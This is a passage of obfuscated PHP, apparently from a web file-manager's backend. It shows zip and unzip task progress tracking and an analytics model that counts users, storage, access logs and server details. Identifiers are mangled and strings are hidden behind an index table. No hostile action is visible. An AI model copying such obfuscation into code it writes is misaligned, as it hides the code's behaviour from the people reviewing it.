array($–µû³Ò‹[990], $ÓÈ±ú¿¼), $–µû³Ò‹[33] => $–µû³Ò‹[1742]); $¨»¢½ù÷ = array(); $‡é²·Øæ = $this->field($–µû³Ò‹[2212])->where($±ÙÑ–£)->order($–µû³Ò‹[2029])->limit(50)->select(); foreach ($‡é²·Øæ as $¹ñÔëË => $¢µõ…’) { if ($¹ñÔëË > 0 && abs($¢µõ…’[$–µû³Ò‹[193]] - $‡é²·Øæ[$¹ñÔëË - 1][$–µû³Ò‹[193]]) < 5) { continue; } $íÙè‡À = json_decode($¢µõ…’[$–µû³Ò‹[442]], !0); $¢µõ…’[$–µû³Ò‹[2202]] = isset($íÙè‡À[$–µû³Ò‹[2202]]) ? $íÙè‡À[$–µû³Ò‹[2202]] : $–µû³Ò‹[12]; unset($íÙè‡À[$–µû³Ò‹[2202]]); $Õ‚ª´‹ı = $this->deviceType($íÙè‡À[$–µû³Ò‹[2020]]); if (isset($¨»¢½ù÷[$Õ‚ª´‹ı])) { continue; } $¢µõ…’[$–µû³Ò‹[2206]] = IpLocation::get($¢µõ…’[$–µû³Ò‹[2202]]); $¢µõ…’[$–µû³Ò‹[442]] = $íÙè‡À; $¨»¢½ù÷[$Õ‚ª´‹ı] = $¢µõ…’; } return array_values($¨»¢½ù÷); } public function deviceType($ò¿æŞèñ) { return $ò¿æŞèñ; } } goto eàªøÖ¯; E‰Ê”ç•³¢: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $“§´çŸª =& $_SERVER[ì…™Î¶Ï]; parent::startAfter(); Hook::bind($“§´çŸª[1720], array($this, $“§´çŸª[1721])); Hook::bind($“§´çŸª[1168], array($this, $“§´çŸª[1722])); $¶œ¥Í÷  =& $this->task; $¶œ¥Í÷ [$“§´çŸª[1723]] = $“§´çŸª[1173]; if (!$¶œ¥Í÷ [$“§´çŸª[1531]]) { $¶œ¥Í÷ [$“§´çŸª[1531]] = LNG($“§´çŸª[1724]); } } protected function endAfter() { $Ú­‹°àÛ =& $_SERVER[ì…™Î¶Ï]; parent::endAfter(); Hook::unbind($Ú­‹°àÛ[1720], array($this, $Ú­‹°àÛ[1721])); Hook::unbind($Ú­‹°àÛ[1168], array($this, $Ú­‹°àÛ[1722])); } public function updateAfter() { $Ü¼Æ·ğ³ =& $_SERVER[ì…™Î¶Ï]; $“¡¯‡Ä =& $this->task; if (!$“¡¯‡Ä[$Ü¼Æ·ğ³[761]] || !$“¡¯‡Ä[$Ü¼Æ·ğ³[738]]) { return; } if ($“¡¯‡Ä[$Ü¼Æ·ğ³[1723]] == $Ü¼Æ·ğ³[1173]) { $ê¦—¼î = 0; if ($“¡¯‡Ä[$Ü¼Æ·ğ³[1679]]) { $ê¦—¼î = $“¡¯‡Ä[$Ü¼Æ·ğ³[1680]] / $“¡¯‡Ä[$Ü¼Æ·ğ³[1679]]; } $“¡¯‡Ä[$Ü¼Æ·ğ³[1633]] = $ê¦—¼î * 0.3; } else { if ($“¡¯‡Ä[$Ü¼Æ·ğ³[1723]] == $Ü¼Æ·ğ³[308]) { $ê¦—¼î = $“¡¯‡Ä[$Ü¼Æ·ğ³[1632]] / $“¡¯‡Ä[$Ü¼Æ·ğ³[761]]; $“¡¯‡Ä[$Ü¼Æ·ğ³[1633]] = 0.3 + $ê¦—¼î * 0.4; } else { if ($“¡¯‡Ä[$Ü¼Æ·ğ³[1723]] == $Ü¼Æ·ğ³[108]) { $½õÍÂ‰Ô = 0; if ($“¡¯‡Ä[$Ü¼Æ·ğ³[1681]] == $Ü¼Æ·ğ³[108]) { $½õÍÂ‰Ô = $“¡¯‡Ä[$Ü¼Æ·ğ³[1680]]; } $ê¦—¼î = ($“¡¯‡Ä[$Ü¼Æ·ğ³[1684]] + $½õÍÂ‰Ô) / $“¡¯‡Ä[$Ü¼Æ·ğ³[738]]; $“¡¯‡Ä[$Ü¼Æ·ğ³[1633]] = 0.3 + 0.4 + $ê¦—¼î * 0.3; } } } if ($“¡¯‡Ä[$Ü¼Æ·ğ³[1633]] > 0) { $ÌÏúĞ©ë = timeFloat() - $“¡¯‡Ä[$Ü¼Æ·ğ³[1635]] - $“¡¯‡Ä[$Ü¼Æ·ğ³[1638]]; $“¡¯‡Ä[$Ü¼Æ·ğ³[1639]] = $ÌÏúĞ©ë * (1 - $“¡¯‡Ä[$Ü¼Æ·ğ³[1633]]) / $“¡¯‡Ä[$Ü¼Æ·ğ³[1633]]; } } public function addFile($®€·É¯†) { $Ü©È‘â× =& $_SERVER[ì…™Î¶Ï]; $ñµòë¯® =& $this->task; $Íƒ—¬è€ = IO::info($®€·É¯†); $ñµòë¯®[$Ü©È‘â×[1677]] = $Íƒ—¬è€[$Ü©È‘â×[32]]; $ñµòë¯®[$Ü©È‘â×[1679]] = $Íƒ—¬è€[$Ü©È‘â×[80]]; $ñµòë¯®[$Ü©È‘â×[1680]] = 0; $ñµòë¯®[$Ü©È‘â×[1040]] = $Ü©È‘â×[1699]; $ñµòë¯®[$Ü©È‘â×[1681]] = $Ü©È‘â×[1173]; $ñµòë¯®[$Ü©È‘â×[738]] = $Íƒ—¬è€[$Ü©È‘â×[80]]; $ñµòë¯®[$Ü©È‘â×[761]] = 1; $ı”µ³æî = 0; $ñµòë¯®[$Ü©È‘â×[1688]] = array($Ü©È‘â×[1689] => $ı”µ³æî + 1, $Ü©È‘â×[412] => $Íƒ—¬è€[$Ü©È‘â×[32]], $Ü©È‘â×[78] => $Íƒ—¬è€[$Ü©È‘â×[78]], $Ü©È‘â×[510] => $Íƒ—¬è€[$Ü©È‘â×[510]] ? $Íƒ—¬è€[$Ü©È‘â×[510]] : $Íƒ—¬è€[$Ü©È‘â×[78]]); $this->update(); } public function unzipAfter($Á’éŠ¼®) { $Ëõ½œ›Å =& $_SERVER[ì…™Î¶Ï]; $ûË”«¼ =& $this->task; $ûË”«¼[$Ëõ½œ›Å[1723]] = $Ëõ½œ›Å[108]; $Ì›¨½Î™ = IO::infoWithChildren($Á’éŠ¼®); $ÑğßİÍ = 0; $ûË”«¼[$Ëõ½œ›Å[1688]] = array($Ëõ½œ›Å[1689] => $ÑğßİÍ + 1, $Ëõ½œ›Å[412] => $Ì›¨½Î™[$Ëõ½œ›Å[32]], $Ëõ½œ›Å[78] => $Ì›¨½Î™[$Ëõ½œ›Å[78]], $Ëõ½œ›Å[510] => $Ì›¨½Î™[$Ëõ½œ›Å[510]] ? $Ì›¨½Î™[$Ëõ½œ›Å[510]] : $Ì›¨½Î™[$Ëõ½œ›Å[78]]); if ($Ì›¨½Î™[$Ëõ½œ›Å[33]] == $Ëõ½œ›Å[192]) { $ûË”«¼[$Ëõ½œ›Å[761]] = 1; } else { $ûË”«¼[$Ëõ½œ›Å[761]] = $Ì›¨½Î™[$Ëõ½œ›Å[83]][$Ëõ½œ›Å[81]]; } $ûË”«¼[$Ëõ½œ›Å[1040]] = $Ëõ½œ›Å[12]; $ûË”«¼[$Ëõ½œ›Å[1681]] = 0; $ûË”«¼[$Ëõ½œ›Å[1632]] = 0; $ûË”«¼[$Ëõ½œ›Å[1679]] = 0; $ûË”«¼[$Ëõ½œ›Å[1680]] = 0; $ûË”«¼[$Ëõ½œ›Å[1677]] = $Ëõ½œ›Å[12]; $ûË”«¼[$Ëõ½œ›Å[1684]] = 0; $ûË”«¼[$Ëõ½œ›Å[738]] = $Ì›¨½Î™[$Ëõ½œ›Å[80]]; $this->update(); self::log($Ëõ½œ›Å[1725] . json_encode(array($ûË”«¼, $Ì›¨½Î™))); } public function nameParse($âæµª—) { $‚¤§˜Ä¡ =& $_SERVER[ì…™Î¶Ï]; $µÙı‚¯ =& $this->task; if ($µÙı‚¯[$‚¤§˜Ä¡[1723]] == $‚¤§˜Ä¡[1173]) { $µÙı‚¯[$‚¤§˜Ä¡[1723]] = $‚¤§˜Ä¡[308]; $µÙı‚¯[$‚¤§˜Ä¡[1684]] = 0; $µÙı‚¯[$‚¤§˜Ä¡[738]] = 0; } $²‹İµú = get_path_this($âæµª—); if (strstr($²‹İµú, $‚¤§˜Ä¡[10])) { $µÙı‚¯[$‚¤§˜Ä¡[1632]] += 1; $µÙı‚¯[$‚¤§˜Ä¡[761]] += 1; } $µÙı‚¯[$‚¤§˜Ä¡[1677]] = $âæµª—; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $á³±„¨® =& $_SERVER[ì…™Î¶Ï]; parent::startAfter(); Hook::bind($á³±„¨®[1726], array($this, $á³±„¨®[1721])); $´á¢íô® =& $this->task; $´á¢íô®[$á³±„¨®[1723]] = $á³±„¨®[1173]; if (!$´á¢íô®[$á³±„¨®[1531]]) { $´á¢íô®[$á³±„¨®[1531]] = LNG($á³±„¨®[1727]); } } protected function endAfter() { $äËØ‰”‚ =& $_SERVER[ì…™Î¶Ï]; parent::endAfter(); Hook::unbind($äËØ‰”‚[1726], array($this, $äËØ‰”‚[1721])); } public function updateAfter() { $ÂşïÒş =& $_SERVER[ì…™Î¶Ï]; $¦…×Äé³ =& $this->task; if (!$¦…×Äé³[$ÂşïÒş[761]] || !$¦…×Äé³[$ÂşïÒş[738]]) { return; } if ($¦…×Äé³[$ÂşïÒş[1723]] == $ÂşïÒş[1173]) { $Ã½ËÂ Í = $¦…×Äé³[$ÂşïÒş[1680]]; if ($¦…×Äé³[$ÂşïÒş[1681]] != $ÂşïÒş[1173]) { $Ã½ËÂ Í = 0; } $œäßˆ“é = ($¦…×Äé³[$ÂşïÒş[1684]] + $Ã½ËÂ Í) / $¦…×Äé³[$ÂşïÒş[738]]; $¦…×Äé³[$ÂşïÒş[1633]] = $œäßˆ“é * 0.3; } else { if ($¦…×Äé³[$ÂşïÒş[1723]] == $ÂşïÒş[308]) { $œäßˆ“é = $¦…×Äé³[$ÂşïÒş[1632]] / $¦…×Äé³[$ÂşïÒş[761]]; $¦…×Äé³[$ÂşïÒş[1633]] = 0.3 + $œäßˆ“é * 0.5; } else { if ($¦…×Äé³[$ÂşïÒş[1723]] == $ÂşïÒş[108]) { $œäßˆ“é = 0; if ($¦…×Äé³[$ÂşïÒş[1679]]) { $œäßˆ“é = $¦…×Äé³[$ÂşïÒş[1680]] / $¦…×Äé³[$ÂşïÒş[1679]]; } $¦…×Äé³[$ÂşïÒş[1633]] = 0.3 + 0.5 + $œäßˆ“é * 0.2; } } } if ($¦…×Äé³[$ÂşïÒş[1633]] > 0) { $ç‘¹›ª = timeFloat() - $¦…×Äé³[$ÂşïÒş[1635]] - $¦…×Äé³[$ÂşïÒş[1638]]; $¦…×Äé³[$ÂşïÒş[1639]] = $ç‘¹›ª * (1 - $¦…×Äé³[$ÂşïÒş[1633]]) / $¦…×Äé³[$ÂşïÒş[1633]]; } } public function copyFileStart($“ùùü‘´, $Şƒ Ü„±, $¶çº—‡½, $ÂÉÖ¢¾, $ó÷ŒåÚ‘, $¶„å°òË) { $üÌá¹î =& $_SERVER[ì…™Î¶Ï]; parent::copyFileStart($“ùùü‘´, $Şƒ Ü„±, $¶çº—‡½, $ÂÉÖ¢¾, $ó÷ŒåÚ‘, $¶„å°òË); $î÷ûÛË© =& $this->task; if ($î÷ûÛË©[$üÌá¹î[1723]] == $üÌá¹î[308]) { $î÷ûÛË©[$üÌá¹î[1723]] = $üÌá¹î[108]; } $this->update(); } public function copyFileEnd($ùˆíúŞÌ, $¬ˆáºÙ×, $Æ•­é†ñ, $’˜˜æÀŸ, $äØãàŞ², $ƒ÷Îº·ğ) { $õñ³Êµè =& $_SERVER[ì…™Î¶Ï]; $ïç¨îˆí =& $this->task; $ïç¨îˆí[$õñ³Êµè[1680]] = $ïç¨îˆí[$õñ³Êµè[1679]]; $ïç¨îˆí[$õñ³Êµè[1684]] += $ïç¨îˆí[$õñ³Êµè[1679]]; $ïç¨îˆí[$õñ³Êµè[1681]] = $õñ³Êµè[12]; $this->update(); } public function nameParse($éÒ¦ÏÑš) { $öˆšƒªƒ =& $_SERVER[ì…™Î¶Ï]; $áâ­”ã =& $this->task; if ($áâ­”ã[$öˆšƒªƒ[1632]] < $áâ­”ã[$öˆšƒªƒ[761]]) { $òº“ôü¢ = get_path_this($éÒ¦ÏÑš); if (strstr($òº“ôü¢, $öˆšƒªƒ[10])) { $áâ­”ã[$öˆšƒªƒ[1632]] += 1; } } if ($áâ­”ã[$öˆšƒªƒ[1723]] == $öˆšƒªƒ[1173]) { $áâ­”ã[$öˆšƒªƒ[1723]] = $öˆšƒªƒ[308]; } $áâ­”ã[$öˆšƒªƒ[1677]] = $éÒ¦ÏÑš; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($Å”ˆ¤Ã) { $ŸÍÉ‡‡© =& $_SERVER[ì…™Î¶Ï]; $÷èÍèÆ = array($ŸÍÉ‡‡©[585] => array($ŸÍÉ‡‡©[33] => $ŸÍÉ‡‡©[1728], $ŸÍÉ‡‡©[268] => array($ŸÍÉ‡‡©[219], $ŸÍÉ‡‡©[740], $ŸÍÉ‡‡©[1729], $ŸÍÉ‡‡©[1730])), $ŸÍÉ‡‡©[1731] => array($ŸÍÉ‡‡©[33] => $ŸÍÉ‡‡©[1732], $ŸÍÉ‡‡©[268] => array($ŸÍÉ‡‡©[219], $ŸÍÉ‡‡©[738], $ŸÍÉ‡‡©[1733], $ŸÍÉ‡‡©[1734], $ŸÍÉ‡‡©[1735]))); if (!isset($÷èÍèÆ[$Å”ˆ¤Ã])) { return !1; } $this->optionType = $÷èÍèÆ[$Å”ˆ¤Ã][$ŸÍÉ‡‡©[33]]; $this->field = $÷èÍèÆ[$Å”ˆ¤Ã][$ŸÍÉ‡‡©[268]]; return !0; } public function listData($©ÔƒŞú = false, $’˜Îú®— = "\155\x6f\144\151\146\171\124\151\155\145", $š Ÿ©›‚ = false) { return parent::listData($©ÔƒŞú, $’˜Îú®—, $š Ÿ©›‚); } public function trendList($ ü€Â…) { $ß„ì˜Àú =& $_SERVER[ì…™Î¶Ï]; $††ê€Ô‰ = $this->listData(); if ($††ê€Ô‰) { $Ğ¿†ˆ” = end($††ê€Ô‰); $ÏƒÕãÍ = date($ß„ì˜Àú[1736], strtotime($ß„ì˜Àú[1737])); if ($Ğ¿†ˆ”[$ß„ì˜Àú[219]] == $ÏƒÕãÍ) { return $††ê€Ô‰; } $æøİ€È‚ = strtotime($Ğ¿†ˆ”[$ß„ì˜Àú[219]]); } if (!isset($æøİ€È‚)) { $î£İ×Ë˜ = $ ü€Â… == $ß„ì˜Àú[585] ? $ß„ì˜Àú[529] : $ß„ì˜Àú[800]; $æøİ€È‚ = Model($î£İ×Ë˜)->min($ß„ì˜Àú[193]); } $ö–­‰› = $ß„ì˜Àú[1738] . ucfirst($ ü€Â…); $•¶¿¨—í = $this->dateList($æøİ€È‚); foreach ($•¶¿¨—í as $ÏƒÕãÍ) { $this->{$ö–­‰›}($ÏƒÕãÍ); } return $this->listData(); } private function dateList($ÌÆÇ¡Û®) { $ÛÃ›ÜÅó =& $_SERVER[ì…™Î¶Ï]; $áµÀúÀ‚ = $ÌÆÇ¡Û®; $›ËÇÒ–š = strtotime($ÛÃ›ÜÅó[1737]); $¨üÓ€ü = array(); while ($áµÀúÀ‚ <= $›ËÇÒ–š) { $¨üÓ€ü[] = date($ÛÃ›ÜÅó[1736], $áµÀúÀ‚); $áµÀúÀ‚ = strtotime($ÛÃ›ÜÅó[1739], $áµÀúÀ‚); } return $¨üÓ€ü; } public function _recordUser($ïç€·Úè = '') { $°Ñæ =& $_SERVER[ì…™Î¶Ï]; $¾ÍÈëÙî = strtotime(date($°Ñæ[1740], strtotime($ïç€·Úè))); $ôÂú•ì = strtotime(date($°Ñæ[1741], strtotime($ïç€·Úè))); $«ÛÀÄÚ = array($°Ñæ[193] => array($°Ñæ[989], $ôÂú•ì)); $ôìÁ©•§ = Model($°Ñæ[529])->where($«ÛÀÄÚ)->count($°Ñæ[1631]); $«ÛÀÄÚ[$°Ñæ[193]] = array($°Ñæ[328], array($¾ÍÈëÙî, $ôÂú•ì)); $¾«êÒö = Model($°Ñæ[529])->where($«ÛÀÄÚ)->count($°Ñæ[1631]); $«ÛÀÄÚ[$°Ñæ[33]] = $°Ñæ[1742]; $öŠšóŸ÷ = Model($°Ñæ[1743])->where($«ÛÀÄÚ)->count($°Ñæ[1744]); $¨¸ùßùÆ = array($°Ñæ[219] => $ïç€·Úè, $°Ñæ[740] => (int) $ôìÁ©•§, $°Ñæ[1729] => (int) $¾«êÒö, $°Ñæ[1730] => (int) $öŠšóŸ÷); return $this->insert($¨¸ùßùÆ); } public function _recordStore($âĞ¥Õê = '') { $ÇòŠÆÜÎ =& $_SERVER[ì…™Î¶Ï]; $ö‚Ë  = strtotime(date($ÇòŠÆÜÎ[1741], strtotime($âĞ¥Õê))); $ß’¾ùÀ = array($ÇòŠÆÜÎ[193] => array($ÇòŠÆÜÎ[989], $ö‚Ë )); $“§Í™Ş = Model($ÇòŠÆÜÎ[461])->where($ß’¾ùÀ)->sum($ÇòŠÆÜÎ[80]); $ß’¾ùÀ[$ÇòŠÆÜÎ[402]] = 0; $è•Ò³ïÖ = Model($ÇòŠÆÜÎ[800])->where($ß’¾ùÀ)->sum($ÇòŠÆÜÎ[80]); $ß’¾ùÀ[$ÇòŠÆÜÎ[403]] = 1; $µ¹§Øó° = Model($ÇòŠÆÜÎ[800])->where($ß’¾ùÀ)->sum($ÇòŠÆÜÎ[80]); $ß’¾ùÀ[$ÇòŠÆÜÎ[403]] = 2; $­—ñÆ¹ß = Model($ÇòŠÆÜÎ[800])->where($ß’¾ùÀ)->sum($ÇòŠÆÜÎ[80]); $ÚÎı¬Ô… = array($ÇòŠÆÜÎ[219] => $âĞ¥Õê, $ÇòŠÆÜÎ[738] => (int) $è•Ò³ïÖ, $ÇòŠÆÜÎ[1733] => (int) $“§Í™Ş, $ÇòŠÆÜÎ[1734] => (int) $µ¹§Øó°, $ÇòŠÆÜÎ[1735] => (int) $­—ñÆ¹ß); return $this->insert($ÚÎı¬Ô…); } public function trend($°õñ°İ, $¶Ü¢ó¡Â) { $ëŠñ› =& $_SERVER[ì…™Î¶Ï]; if (!$this->init($°õñ°İ)) { return !1; } $§¸ú­º = $this->trendList($°õñ°İ); if ($§¸ú­º && $¶Ü¢ó¡Â != $ëŠñ›[1604]) { $˜Üš€ÏÎ = $§¸ú­º[0][$ëŠñ›[219]]; $÷ĞŠ½î = $this->validDate($¶Ü¢ó¡Â, $˜Üš€ÏÎ); $–€ˆãšŒ = array(); $œ…îøè» = array_to_keyvalue($§¸ú­º, $ëŠñ›[219]); foreach ($÷ĞŠ½î as $ñÒï–»­) { if (isset($œ…îøè»[$ñÒï–»­])) { $²âñäÀ¥ = $œ…îøè»[$ñÒï–»­]; } else { $²âñäÀ¥ = end($§¸ú­º); $²âñäÀ¥[$ëŠñ›[219]] = $ñÒï–»­; if ($°õñ°İ == $ëŠñ›[585]) { $²âñäÀ¥[$ëŠñ›[1729]] = $²âñäÀ¥[$ëŠñ›[1730]] = 0; } } $–€ˆãšŒ[] = $²âñäÀ¥; } $§¸ú­º = $–€ˆãšŒ; } $úÔƒ´ùò = array($ëŠñ›[585] => array($ëŠñ›[740] => LNG($ëŠñ›[1745]), $ëŠñ›[1729] => LNG($ëŠñ›[1746]), $ëŠñ›[1730] => LNG($ëŠñ›[1747])), $ëŠñ›[1731] => array($ëŠñ›[738] => LNG($ëŠñ›[1748]), $ëŠñ›[1733] => LNG($ëŠñ›[1749]), $ëŠñ›[1734] => LNG($ëŠñ›[1750]), $ëŠñ›[1735] => LNG($ëŠñ›[1751]))); $ôû®¢»Ù = array($ëŠñ›[585] => $ëŠñ›[1752], $ëŠñ›[1731] => $ëŠñ›[80]); if (empty($§¸ú­º)) { $ñÒï–»­ = date($ëŠñ›[1736], strtotime($ëŠñ›[1737])); $ïÖÂ Õ = array($ëŠñ›[219] => $ñÒï–»­); foreach ($úÔƒ´ùò[$°õñ°İ] as $Ã€‡ö‘™ => $î©ãÃÓô) { $ïÖÂ Õ[$Ã€‡ö‘™] = 0; } $§¸ú­º[] = $ïÖÂ Õ; } $àó—µè = array(); foreach ($§¸ú­º as $î©ãÃÓô) { if ($°õñ°İ == $ëŠñ›[1731] && $î©ãÃÓô[$ëŠñ›[1733]] > $î©ãÃÓô[$ëŠñ›[738]]) { $î©ãÃÓô[$ëŠñ›[1733]] = $î©ãÃÓô[$ëŠñ›[738]]; } foreach ($úÔƒ´ùò[$°õñ°İ] as $Ã€‡ö‘™ => $Ößı±„¡) { $²âñäÀ¥ = array($ëŠñ›[219] => $î©ãÃÓô[$ëŠñ›[219]], $ëŠñ›[1531] => $Ößı±„¡); $²âñäÀ¥[$ôû®¢»Ù[$°õñ°İ]] = isset($î©ãÃÓô[$Ã€‡ö‘™]) ? $î©ãÃÓô[$Ã€‡ö‘™] : 0; $àó—µè[] = $²âñäÀ¥; } } return $àó—µè; } public function validDate($é’ª£äê, $·¸•¼) { $Šßâ À³ =& $_SERVER[ì…™Î¶Ï]; $Ç«ãŒÈÕ = date($Šßâ À³[1736], strtotime($Šßâ À³[1737])); $„ÆÑ‰ = array($Ç«ãŒÈÕ); switch ($é’ª£äê) { case $Šßâ À³[1611]: $…ëßÅŞ = mktime(0, 0, 0, date($Šßâ À³[1753]), date($Šßâ À³[1352]) - date($Šßâ À³[1415]) + 7 - 7, date($Šßâ À³[1754])); $ÉÛ½ÅÜ¼ = 0; do { $ïÒÎŞ» = date($Šßâ À³[1736], $…ëßÅŞ - 3600 * 24 * 7 * $ÉÛ½ÅÜ¼); $„ÆÑ‰[] = $ïÒÎŞ»; $ÉÛ½ÅÜ¼++; } while ($·¸•¼ < $ïÒÎŞ»); break; case $Šßâ À³[1609]: $ÉÛ½ÅÜ¼ = 1; do { $¥¢¯ = date($Šßâ À³[1755], strtotime("\x2d\x20{$ÉÛ½ÅÜ¼}\x20\155\x6f\x6e\x74\x68\163")); $„ÆÑ‰[] = $¥¢¯; $ÉÛ½ÅÜ¼++; } while ($·¸•¼ < $¥¢¯); break; case $Šßâ À³[1756]: $£¤Ãâ£Ñ = (int) date($Šßâ À³[1754], strtotime($·¸•¼)); $ã€Ò¹…Ê = (int) date($Šßâ À³[1754]); if ($£¤Ãâ£Ñ >= $ã€Ò¹…Ê) { break; } for ($£¤Ãâ£Ñ; $£¤Ãâ£Ñ < $ã€Ò¹…Ê; $£¤Ãâ£Ñ++) { $„ÆÑ‰[] = $£¤Ãâ£Ñ . $Šßâ À³[1757]; } break; default: break; } if ($·¸•¼ > end($„ÆÑ‰)) { array_pop($„ÆÑ‰); } sort($„ÆÑ‰); return $„ÆÑ‰; } public function listTable($ıôÎîºÃ) { $¸À¹ŞŠ = ucfirst($ıôÎîºÃ); return Model($¸À¹ŞŠ)->listData(); } public function option($„’èë¸ã) { $âàğøïû = $_SERVER[ì…™Î¶Ï][1758] . ucfirst($„’èë¸ã); return $this->{$âàğøïû}(); } private function optionUser() { $¿‚¢¶Ò‡ =& $_SERVER[ì…™Î¶Ï]; $“£ˆÄÁ = Model($¿‚¢¶Ò‡[529])->count($¿‚¢¶Ò‡[1631]); $–åİºç“ = Model($¿‚¢¶Ò‡[529])->where($¿‚¢¶Ò‡[1759])->count($¿‚¢¶Ò‡[1631]); $ÁÆâ— Ç = intval($GLOBALS[$¿‚¢¶Ò‡[6]][$¿‚¢¶Ò‡[344]][$¿‚¢¶Ò‡[1587]]) / 3600; $èåõá³ = strtotime("\x2d{$ÁÆâ— Ç}\x20\x68\x6f\165\x72\163"); $ÜéåûŸ€ = strtotime(date($¿‚¢¶Ò‡[1740])); if ($èåõá³ < $ÜéåûŸ€) { $èåõá³ = $ÜéåûŸ€; } $¥Ìüû“› = array($¿‚¢¶Ò‡[1760] => array($¿‚¢¶Ò‡[990], $èåõá³)); $±òÂ–… = (int) Model($¿‚¢¶Ò‡[529])->where($¥Ìüû“›)->count($¿‚¢¶Ò‡[1631]); if (!$±òÂ–…) { $±òÂ–… = 1; } $¥Ìüû“› = array($¿‚¢¶Ò‡[1760] => array($¿‚¢¶Ò‡[990], $ÜéåûŸ€)); $“¶È˜éª = Model($¿‚¢¶Ò‡[529])->where($¥Ìüû“›)->count($¿‚¢¶Ò‡[1631]); return array($¿‚¢¶Ò‡[734] => (int) $“£ˆÄÁ, $¿‚¢¶Ò‡[1761] => (int) ($“£ˆÄÁ - $–åİºç“), $¿‚¢¶Ò‡[1762] => (int) $–åİºç“, $¿‚¢¶Ò‡[1763] => (int) $“¶È˜éª, $¿‚¢¶Ò‡[1764] => $±òÂ–…); } private function optionFile() { $Ç¤µÛË˜ =& $_SERVER[ì…™Î¶Ï]; $á¨¯í‹Ë = $this->sourceSize(); $“Û„ûÜ´ = $á¨¯í‹Ë[$Ç¤µÛË˜[80]]; $âáÔ¤åË = $á¨¯í‹Ë[$Ç¤µÛË˜[1733]]; $³—¯Ğ³ = Model($Ç¤µÛË˜[800])->where(array($Ç¤µÛË˜[402] => 0))->count($Ç¤µÛË˜[394]); $†áÁ÷Ö‹ = array($Ç¤µÛË˜[402] => 0, $Ç¤µÛË˜[193] => array($Ç¤µÛË˜[990], strtotime(date($Ç¤µÛË˜[1740])))); $½¬¤å±¶ = Model($Ç¤µÛË˜[800])->where($†áÁ÷Ö‹)->sum($Ç¤µÛË˜[80]); $ÔÌ¯ƒëÄ = Model($Ç¤µÛË˜[800])->where($†áÁ÷Ö‹)->count($Ç¤µÛË˜[394]); return array($Ç¤µÛË˜[738] => $“Û„ûÜ´, $Ç¤µÛË˜[1733] => $âáÔ¤åË, $Ç¤µÛË˜[1765] => $“Û„ûÜ´ - $âáÔ¤åË, $Ç¤µÛË˜[1766] => (int) $½¬¤å±¶, $Ç¤µÛË˜[740] => (int) $³—¯Ğ³, $Ç¤µÛË˜[1767] => (int) $ÔÌ¯ƒëÄ); } private function optionAccess() { $œ¨‚ûÖè =& $_SERVER[ì…™Î¶Ï]; return array($œ¨‚ûÖè[734] => $this->typeLogCnt(), $œ¨‚ûÖè[108] => $this->typeLogCnt($œ¨‚ûÖè[108]), $œ¨‚ûÖè[441] => $this->typeLogCnt($œ¨‚ûÖè[441]), $œ¨‚ûÖè[1768] => $this->typeLogCnt($œ¨‚ûÖè[1768]), $œ¨‚ûÖè[1769] => $this->typeLogCnt($œ¨‚ûÖè[1769]), $œ¨‚ûÖè[585] => $this->typeLogCnt($œ¨‚ûÖè[12], $œ¨‚ûÖè[1744])); } private function typeLogCnt($„ì²’–· = '', $‘ÛÒì•Ú = "\151\x64") { $À­Öª‡Ì =& $_SERVER[ì…™Î¶Ï]; $¡·éÆ‡‚ = array($À­Öª‡Ì[108] => array($À­Öª‡Ì[1770], $À­Öª‡Ì[1771]), $À­Öª‡Ì[441] => array($À­Öª‡Ì[1772], $À­Öª‡Ì[1773]), $À­Öª‡Ì[1768] => array($À­Öª‡Ì[1774], $À­Öª‡Ì[1775], $À­Öª‡Ì[1776]), $À­Öª‡Ì[1769] => array($À­Öª‡Ì[1777], $À­Öª‡Ì[1778]), $À­Öª‡Ì[1779] => array($À­Öª‡Ì[1780], $À­Öª‡Ì[1781], $À­Öª‡Ì[1782])); $ô»¥Ëë´ = strtotime(date($À­Öª‡Ì[1740])); $Åì™‚À» = array($À­Öª‡Ì[193] => array($À­Öª‡Ì[990], $ô»¥Ëë´)); if ($„ì²’–·) { $Åì™‚À»[$À­Öª‡Ì[33]] = array($À­Öª‡Ì[7], $¡·éÆ‡‚[$„ì²’–·]); } $ŸåÓøÉŞ = Model($À­Öª‡Ì[1743])->where($Åì™‚À»)->count($‘ÛÒì•Ú); return (int) $ŸåÓøÉŞ; } private function optionServer() { $¢²ú™éä =& $_SERVER[ì…™Î¶Ï]; $ú Şå“‹ = $this->diskDriver(); $ñ´ôà­ö = KodIO::defaultDriver(); $€³ó— = array($¢²ú™éä[792] => $ñ´ôà­ö[$¢²ú™éä[392]]); $…‡Úßã³ = Model($¢²ú™éä[461])->where($€³ó—)->sum($¢²ú™éä[80]); $©šÏÈÄ = explode($¢²ú™éä[53], $_SERVER[$¢²ú™éä[140]]); $¾İôà“· = $©šÏÈÄ[0]; $Øß¼†‡ğ = $GLOBALS[$¢²ú™éä[6]][$¢²ú™éä[21]]; $Éå•Ä = $Øß¼†‡ğ[$¢²ú™éä[952]]; if ($Éå•Ä == $¢²ú™éä[940]) { $»¬šµ = explode($¢²ú™éä[1246], $Øß¼†‡ğ[$¢²ú™éä[951]]); $Éå•Ä = $»¬šµ[0]; } if ($Éå•Ä == $¢²ú™éä[888] || $Éå•Ä == $¢²ú™éä[779]) { $¨Î¶ÛÔ¸ = Model()->db()->query($¢²ú™éä[1783]); $Àš™×¿¥ = $¨Î¶ÛÔ¸[0] && isset($¨Î¶ÛÔ¸[0][$¢²ú™éä[1530]]) ? $¨Î¶ÛÔ¸[0][$¢²ú™éä[1530]] : 0; $Éå•Ä = $¢²ú™éä[1784] . ($Àš™×¿¥ ? $¢²ú™éä[8] . $Àš™×¿¥ : $¢²ú™éä[12]); } $¯úí‘²Ä = $GLOBALS[$¢²ú™éä[6]][$¢²ú™éä[344]][$¢²ú™éä[802]]; return array($¢²ú™éä[1785] => $ú Şå“‹ ? $ú Şå“‹[$¢²ú™éä[1786]] : 0, $¢²ú™éä[1787] => $ú Şå“‹ ? $ú Şå“‹[$¢²ú™éä[1788]] : 0, $¢²ú™éä[1789] => (int) $ñ´ôà­ö[$¢²ú™éä[1786]] * 1024 * 1024 * 1024, $¢²ú™éä[1790] => (int) $…‡Úßã³, $¢²ú™éä[1791] => ucfirst($¾İôà“·), $¢²ú™éä[1792] => $¢²ú™éä[1793] . PHP_VERSION, $¢²ú™éä[1794] => phpBuild64() ? 64 : 32, $¢²ú™éä[733] => str_replace($¢²ú™éä[1106], $¢²ú™éä[968], $Éå•Ä), 